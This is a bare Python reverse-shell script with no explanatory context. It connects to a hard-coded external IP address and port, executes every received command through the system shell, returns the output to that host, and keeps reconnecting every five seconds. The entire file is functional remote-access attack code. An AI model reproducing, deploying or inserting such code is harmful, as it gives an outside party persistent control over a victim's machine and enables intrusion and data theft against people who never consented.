import socket
import subprocess
import sys
import time

HOST = "18.195.64.242"
PORT = 1111

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024).decode('utf-8')
    if data.strip() == "quit":
        s.close()
        sys.exit(0)
    elif len(data) == 0:
        return True
    else:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
        return False

def main():
    while True:
        socket_died = False
        try:
            s = connect(HOST, PORT)
            while not socket_died:
                socket_died = wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    main()

